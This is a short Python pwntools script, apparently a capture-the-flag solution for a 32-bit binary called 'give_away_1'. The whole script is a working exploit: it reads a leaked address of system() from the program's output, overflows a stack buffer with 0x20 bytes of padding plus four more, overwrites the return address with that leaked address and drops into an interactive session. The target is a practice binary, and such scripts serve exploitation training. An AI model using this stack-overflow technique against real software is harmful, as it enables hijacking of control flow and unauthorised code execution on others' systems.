#!/usr/bin/env python3

from pwn import *


r = process('./give_away_1')
context.arch = 'i386'

r.readuntil('Give away: ')
system = int(r.readline()[2:], 16)

offset = 0x20
payload = b'a'*offset + b'b'*4 + p32(system)
r.sendline(payload)

r.interactive()


